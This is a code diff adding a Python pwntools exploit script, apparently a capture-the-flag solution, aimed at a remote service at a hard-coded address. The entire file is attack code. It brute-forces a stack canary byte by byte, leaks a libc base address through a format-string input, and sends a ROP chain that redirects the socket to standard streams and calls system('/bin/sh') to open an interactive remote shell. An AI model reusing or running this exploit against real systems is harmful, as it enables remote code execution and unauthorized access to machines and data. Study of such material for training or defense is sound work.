@@ -1,0 +1,65 @@
+from pwn import *
+
+libc = context.binary = ELF("libc.so.6")
+host = '94.237.120.112'
+port = 30823
+
+def start():
+    return remote(host, port)
+
+def brute_force_canary():
+    canary = b'\x00'
+    for i in range(7):
+        for byte in range(256):
+            test_canary = canary + bytes([byte])
+            io = start()
+            io.sendlineafter(b'=> ', b'A')
+            io.sendlineafter(b'=> ', b'1')
+            io.sendlineafter(b'=> ', b'4')
+            io.sendlineafter(b'=> ', b'2')
+            io.sendlineafter(b'=> ', b'A' * 255)
+            io.sendlineafter(b'=> ', b'y')
+            io.sendafter(b'=> ', b'A' * 8 + test_canary)
+            try:
+                io.recvline()
+                io.recvline()
+                io.recvline()
+                canary += bytes([byte])
+                io.close()
+                break
+            except EOFError:
+                io.close()
+    return canary
+
+def leak_libc():
+    io = start()
+    io.sendlineafter(b'=> ', b'a' * 0x10)
+    io.sendlineafter(b'=> ', b'1')
+    io.sendlineafter(b'=> ', b'%2$p')
+    io.close()
+
+    io = start()
+    io.sendlineafter(b'=> ', b'a' * 0x10)
+    io.sendlineafter(b'=> ', b'5')
+    io.recvuntil(b'Table for ')
+    libc_base = int(io.recv(14), 16) - libc.sym['lseek64'] - 11
+    io.close()
+    return libc_base
+
+libc.address = leak_libc()
+canary = brute_force_canary()
+rop = ROP(libc)
+for fd in range(3):
+    rop.call(libc.sym['dup2'], [4, fd])
+rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh'))])
+payload = b"A" * 8 + canary + p64(0) + rop.chain()
+
+io = start()
+io.sendlineafter(b'=> ', b'notagain')
+io.sendlineafter(b'=> ', b'1')
+io.sendlineafter(b'=> ', b'4')
+io.sendlineafter(b'=> ', b'2')
+io.sendlineafter(b'=> ', b'a' * 255)
+io.sendlineafter(b'=> ', b'y')
+io.sendafter(b'=> ', payload)
+io.interactive()
